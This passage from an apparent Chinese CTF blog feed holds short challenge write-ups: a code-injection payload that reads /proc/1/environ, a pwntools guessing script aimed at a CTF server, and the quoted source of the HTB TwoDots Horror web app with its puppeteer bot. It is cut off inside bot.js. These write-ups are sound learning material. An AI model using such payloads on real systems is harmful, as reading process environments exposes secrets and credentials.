直接open打开就能查看到</span><br><span class=\"line\">&#123;print(open(&quot;/proc/1/environ&quot;).read())&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> WEB</h2>\n<h3 id=\"happygame没有出\"><a class=\"anchor\" href=\"#happygame没有出\">#</a> happygame（没有出）</h3>\n<p>web 题我看了很久，硬是搞不懂他这个怎么 happygame 了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">���11</span><br><span class=\"line\">\\���HTTP/2 client preface string missing or corrupt. Hex dump for received bytes: 31310a</span><br></pre></td></tr></table></figure></p>\n<p>怎么看也不像 http 呀我还用 nmap 的 - sV 扫了一下</p>\n<p>还是不行</p>\n<p>可以得到的点就是这个输入什么能输出 hex 编码后的结果并且后面还有一个 0a</p>\n<p>输出超过 24 就不会显示 0a 了</p>\n<p>并且前面的输出位数也能得到信息不同位数会发生变化得到的信息是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Z\\^`bdfhjlnprtvxz|~80 82 84 86</span><br></pre></td></tr></table></figure></p>\n<p>到了 86 后就不会在增加了</p>\n<p>转为 hex 可以知道</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5a 5c 5e 60 62 64 66 68 6a 6c 6e 70 72 74 76 78 7a 7c 7e</span><br></pre></td></tr></table></figure></p>\n<p>每经过一位相当于增加了 2</p>\n<p>还用 ciphey 跑出来了这个</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">KEYS[] mgauoicwqkey</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"crypto\"><a class=\"anchor\" href=\"#crypto\">#</a> Crypto</h2>\n<h3 id=\"guess-game\"><a class=\"anchor\" href=\"#guess-game\">#</a> guess game</h3>\n<p>这种游戏题最好玩了直接通过随机多次能够出 flag</p>\n<p>exp</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Util.number import bytes_to_long, long_to_bytes</span><br><span class=\"line\">from os import urandom</span><br><span class=\"line\">from binascii import unhexlify</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\">context.log_level=&#x27;debug&#x27;</span><br><span class=\"line\">class cipher:</span><br><span class=\"line\">    def __init__(self, key, rounds=4):</span><br><span class=\"line\">        self.key = key</span><br><span class=\"line\">        self.rounds = rounds</span><br><span class=\"line\">        self.sbox = [0xc, 0x5, 0x6, 0xb, 0x9, 0x0, 0xa, 0xd, 0x3, 0xe, 0xf, 0x8, 0x4, 0x7, 0x1, 0x2]</span><br><span class=\"line\">        self.pbox = [0, 16, 32, 48, 1, 17, 33, 49, 2, 18, 34, 50, 3, 19, 35, 51, 4, 20, 36, 52, 5, 21, 37, 53, 6, 22, 38, 54, 7, 23, 39, 55, 8, 24, 40, 56, 9, 25, 41, 57, 10, 26, 42, 58, 11, 27, 43, 59, 12, 28, 44, 60, 13, 29, 45, 61, 14, 30, 46, 62, 15, 31, 47, 63]</span><br><span class=\"line\">        self.rk = self.genrk(self.key)</span><br><span class=\"line\">    </span><br><span class=\"line\">    def substitution(self, state):</span><br><span class=\"line\">        output = 0</span><br><span class=\"line\">        for i in range(16):</span><br><span class=\"line\">            output += self.sbox[state &gt;&gt; (i*4) &amp; 0xF] &lt;&lt; (i*4)</span><br><span class=\"line\">        return output</span><br><span class=\"line\">    </span><br><span class=\"line\">    def permutation(self, state):</span><br><span class=\"line\">        output = 0</span><br><span class=\"line\">        for i in range(64):</span><br><span class=\"line\">            output += ((state &gt;&gt; i) &amp; 0x1) &lt;&lt; self.pbox[i]</span><br><span class=\"line\">        return output</span><br><span class=\"line\">    </span><br><span class=\"line\">    def genrk(self, key):</span><br><span class=\"line\">        rk = []</span><br><span class=\"line\">        for i in range(1, self.rounds+1):</span><br><span class=\"line\">            rk.append(key &gt;&gt; 16)</span><br><span class=\"line\">            key = ((key &amp; (2**19-1)) &lt;&lt; 61) + (key &gt;&gt; 19)</span><br><span class=\"line\">            key = (self.sbox[key &gt;&gt; 76] &lt;&lt; 76)+(key &amp; (2**76-1))</span><br><span class=\"line\">            key ^= i &lt;&lt; 15</span><br><span class=\"line\">        return rk</span><br><span class=\"line\">    </span><br><span class=\"line\">    def addrk(self, state, rk):</span><br><span class=\"line\">        return state ^ rk</span><br><span class=\"line\">    </span><br><span class=\"line\">    def encrypt(self, pt):</span><br><span class=\"line\">        ct = b&quot;&quot;</span><br><span class=\"line\">        state = pt</span><br><span class=\"line\">        for i in range(self.rounds-1):</span><br><span class=\"line\">            state = self.addrk(state, self.rk[i])</span><br><span class=\"line\">            state = self.substitution(state)</span><br><span class=\"line\">            state = self.permutation(state)</span><br><span class=\"line\">        state = self.addrk(state, self.rk[-1])</span><br><span class=\"line\">        ct += long_to_bytes(state)</span><br><span class=\"line\">        return ct</span><br><span class=\"line\"></span><br><span class=\"line\">    def hint(self, pt):</span><br><span class=\"line\">        return self.encrypt(pt)</span><br><span class=\"line\"></span><br><span class=\"line\">count = 0</span><br><span class=\"line\">success = 0</span><br><span class=\"line\">key = int.from_bytes(urandom(10), &quot;big&quot;) </span><br><span class=\"line\">guess = list(map(int, list(bin(key)[2:].zfill(80))))</span><br><span class=\"line\">game = cipher(key)</span><br><span class=\"line\">ll=0</span><br><span class=\"line\">while True:</span><br><span class=\"line\">    p=remote(&quot;47.97.69.130&quot;,22333)</span><br><span class=\"line\">    f=open(&quot;曲线25.txt&quot;,&quot;a&quot;)</span><br><span class=\"line\">    cc=0</span><br><span class=\"line\">    dd=0</span><br><span class=\"line\">    ll+=1</span><br><span class=\"line\">    p.recvuntil(b&quot;oken:&quot;)</span><br><span class=\"line\">    p.sendline(b&quot;icqc0ccfef5755b58ad320ede21cfa79&quot;)</span><br><span class=\"line\">    p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">    p.sendline(b&quot;2&quot;)</span><br><span class=\"line\">    for i in range(len(guess)):</span><br><span class=\"line\">        p.recvuntil(b&quot;&gt;&quot;)</span><br><span class=\"line\">        p.sendline(str(guess[i]))</span><br><span class=\"line\">        gg=p.recvline()\t</span><br><span class=\"line\">        if &quot;Right!&quot; in str(gg): </span><br><span class=\"line\">            cc+=1</span><br><span class=\"line\">        if &quot;Wrong&quot; in str(gg):</span><br><span class=\"line\">             dd+=1</span><br><span class=\"line\">    if cc&gt;57:</span><br><span class=\"line\">            print(gg)</span><br><span class=\"line\">            print(f&quot;成功了&#123;cc&#125;次&quot;)</span><br><span class=\"line\">            break</span><br><span class=\"line\">    print(gg)</span><br><span class=\"line\">    print(f&quot;成功了&#123;cc&#125;次&quot;)</span><br><span class=\"line\">    print(f&quot;错误了&#123;dd&#125;次&quot;)</span><br><span class=\"line\">    f.write(f&quot;第&#123;ll&#125;把，成功了&#123;cc&#125;次&quot;)</span><br><span class=\"line\">    f.write(f&quot;失败了&#123;dd&#125;次\\n&quot;)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"强网先锋\"><a class=\"anchor\" href=\"#强网先锋\">#</a> 强网先锋</h2>\n<h3 id=\"speedup\"><a class=\"anchor\" href=\"#speedup\">#</a> SpeedUp</h3>\n<p>通过计算跑出</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SpeedUp</span><br><span class=\"line\"></span><br><span class=\"line\">找到2的27次方</span><br><span class=\"line\">4495662081 去md5加密成sha256 flag&#123;加密后的&#125;</span><br></pre></td></tr></table></figure></p>\n",
            "tags": [
                "CTF"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-TwoDots-Horror/",
            "url": "https://lookhui.github.io/HTB-TwoDots-Horror/",
            "title": "HTB-TwoDots_Horror",
            "date_published": "2023-12-15T12:23:43.000Z",
            "content_html": "<h1 id=\"twodots-horror未完成\"><a class=\"anchor\" href=\"#twodots-horror未完成\">#</a> TwoDots Horror（未完成）</h1>\n<p>白盒测试</p>\n<p>这个代码是 node.js 写的我们首先查看这个 dockerfile 发现并没有 flag 信息</p>\n<p>审计一下这些 js 代码</p>\n<p>index.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const express       = require(&#x27;express&#x27;);</span><br><span class=\"line\">const fileUpload    = require(&#x27;express-fileupload&#x27;);</span><br><span class=\"line\">const app           = express();</span><br><span class=\"line\">const path          = require(&#x27;path&#x27;);</span><br><span class=\"line\">const bodyParser    = require(&#x27;body-parser&#x27;);</span><br><span class=\"line\">const cookieParser  = require(&#x27;cookie-parser&#x27;);</span><br><span class=\"line\">const nunjucks      = require(&#x27;nunjucks&#x27;);</span><br><span class=\"line\">const routes        = require(&#x27;./routes&#x27;);</span><br><span class=\"line\">const Database      = require(&#x27;./database&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">const db = new Database(&#x27;TwoDots-Horror.db&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(bodyParser.json());</span><br><span class=\"line\">app.use(bodyParser.urlencoded(&#123; extended: true &#125;));</span><br><span class=\"line\">app.use(cookieParser());</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(fileUpload(&#123; limits: &#123;</span><br><span class=\"line\">\t\tfileSize: 2 * 1024 * 1024 // 2 MB</span><br><span class=\"line\">\t&#125;,</span><br><span class=\"line\">\tabortOnLimit: true</span><br><span class=\"line\"> &#125;));</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(function(req, res, next) &#123;</span><br><span class=\"line\">\tres.setHeader(&quot;Content-Security-Policy&quot;, &quot;default-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src &#x27;self&#x27; https://fonts.googleapis.com; font-src &#x27;self&#x27; https://fonts.gstatic.com;&quot;)</span><br><span class=\"line\">\tnext();</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">nunjucks.configure(&#x27;views&#x27;, &#123;</span><br><span class=\"line\">\tautoescape: true,</span><br><span class=\"line\">\texpress: app</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.set(&#x27;views&#x27;, &#x27;./views&#x27;);</span><br><span class=\"line\">app.use(&#x27;/static&#x27;, express.static(path.resolve(&#x27;static&#x27;)));</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(routes(db));</span><br><span class=\"line\"></span><br><span class=\"line\">app.all(&#x27;*&#x27;, (req, res) =&gt; &#123;</span><br><span class=\"line\">\treturn res.status(404).send(&#123;</span><br><span class=\"line\">\t\tmessage: &#x27;404 page not found&#x27;</span><br><span class=\"line\">\t&#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">(async () =&gt; &#123;</span><br><span class=\"line\">\tawait db.connect();</span><br><span class=\"line\">\tawait db.migrate();</span><br><span class=\"line\">\tapp.listen(1337, &#x27;0.0.0.0&#x27;, () =&gt; console.log(&#x27;Listening on port 1337&#x27;));</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure></p>\n<p>database.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const sqlite = require(&#x27;sqlite-async&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">class Database &#123;</span><br><span class=\"line\">\tconstructor(db_file) &#123;</span><br><span class=\"line\">\t\tthis.db_file = db_file;</span><br><span class=\"line\">\t\tthis.db = undefined;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tasync connect() &#123;</span><br><span class=\"line\">\t\tthis.db = await sqlite.open(this.db_file);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync migrate() &#123;</span><br><span class=\"line\">\t\treturn this.db.exec(`</span><br><span class=\"line\">            DROP TABLE IF EXISTS users;</span><br><span class=\"line\"></span><br><span class=\"line\">            CREATE TABLE IF NOT EXISTS users (</span><br><span class=\"line\">                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">                username   VARCHAR(255) NOT NULL UNIQUE,</span><br><span class=\"line\">                password   VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                avatar     VARCHAR(255) NOT NULL</span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">            DROP TABLE IF EXISTS posts;</span><br><span class=\"line\"></span><br><span class=\"line\">            CREATE TABLE IF NOT EXISTS posts (</span><br><span class=\"line\">                id         INTEGER      NOT NULL PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">                author  VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                content    VARCHAR(255) NOT NULL,</span><br><span class=\"line\">                approved   INTEGER      NOT NULL,</span><br><span class=\"line\">                created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP</span><br><span class=\"line\">            );</span><br><span class=\"line\"></span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;ColonelAengus&#x27;, 1, &#x27;Our baby girl is finally crawling for the first time. I just wish it wasn’t on the ceiling.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;windowsXP&#x27;, 1, &#x27;Keyboard not responding. Press any key to continue.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;unkn0wn&#x27;, 1, &#x27;There was a picture in my phone of me sleeping. I live alone.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;Scry67&#x27;, 1, &#x27;The last man on Earth sat alone in a room. There was a knock at the door.&#x27;);</span><br><span class=\"line\">            INSERT INTO posts (author, approved, content) VALUES (&#x27;fluffyponyza&#x27;, 1, &#x27;Day 312. Internet still not working.&#x27;);</span><br><span class=\"line\">        `);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync registerUser(user, pass) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;INSERT INTO users (username, password, avatar) VALUES ( ?, ?, &quot;default.jpg&quot;)&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve((await stmt.run(user, pass)));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync loginUser(user, pass) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT username FROM users WHERE username = ? and password = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.get(user, pass));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync getUser(user) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT * FROM users WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.get(user));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync checkUser(user) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT username FROM users WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tlet row = await stmt.get(user);</span><br><span class=\"line\">\t\t\t\tresolve(row !== undefined);</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync updateAvatar(user, avatar) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;UPDATE users SET avatar = ? WHERE username = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.run(avatar, user));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync addPost(author, content) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;INSERT INTO posts (author, content, approved) VALUES (? , ?, 0)&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.run(author, content));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tasync getPosts(approved=1) &#123;</span><br><span class=\"line\">\t\treturn new Promise(async (resolve, reject) =&gt; &#123;</span><br><span class=\"line\">\t\t\ttry &#123;</span><br><span class=\"line\">\t\t\t\tlet stmt = await this.db.prepare(&#x27;SELECT * FROM posts WHERE approved = ?&#x27;);</span><br><span class=\"line\">\t\t\t\tresolve(await stmt.all(approved));</span><br><span class=\"line\">\t\t\t&#125; catch(e) &#123;</span><br><span class=\"line\">\t\t\t\treject(e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">module.exports = Database;</span><br></pre></td></tr></table></figure></p>\n<p>这个数据库语法使用了预处理无法造成常规 sql 注入</p>\n<p>bot.js</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const puppeteer = require(&#x27;puppeteer&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">const browser_options = &#123;</span><br><span class=\"line\">\theadless: true,</span><br><span class=\"line\">\targs: [</span><br><span class=\"line\">\t\t&#x27;--no-sandbox&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-background-networking&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-default-apps&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-extensions&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-gpu&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-sync&#x27;,</span><br><span class=\"line\">\t\t&#x27;--disable-translate&#x27;,</span><br><span class=\"line\">\t\t&#x27;--hide-scrollbars&#x27;,</span><br><span class=\"line\">\t\t&#x27;--metrics-recording-only&#x27;,</span><br><span class=\"line\">\t\t&#x27;--mute-audio&#x27;,</span><br><span class=\"line\">\t\t&#x27;--no-first-run&#x27;,</span><br><span class=\"line\">\t\t&#x27;--safebrowsing-disable-auto-update&#x27;</span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">const cookies = [&#123;</span><br><span class=\"line\">    &#x27;name&#x27;: &#x27;flag&#x27;,</span><br><span class=\"line\">    &#x27;value&#x27;: &#x27;HTB&#123;f4k3_fl4g_f0r_t3st1ng&#125;&#x27;</span><br><span class=\"line\">&#125;];</span><br><span class=\"line\"></span><br><span class=\"line\">async function purgeData(db)&#123;</span><br><span class=\"line\">\tconst browser = await puppeteer.launch(browser_options);</span><br><span class=\"line\">\tconst page = await browser.newPage();</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait page.goto(&#x27;http://127.0.0.1:1337/&#x27;);</span><br><span class=\"line\">\tawait page.setCookie(...cookies);</span><br><span class=\"line\"></span><br><span class=\"line\">\tawait page.goto(&#x27;http://127.0.0.1:1337/review&#x27;, &#123;</span><br><span class=\"line\">\t\twaitUntil: 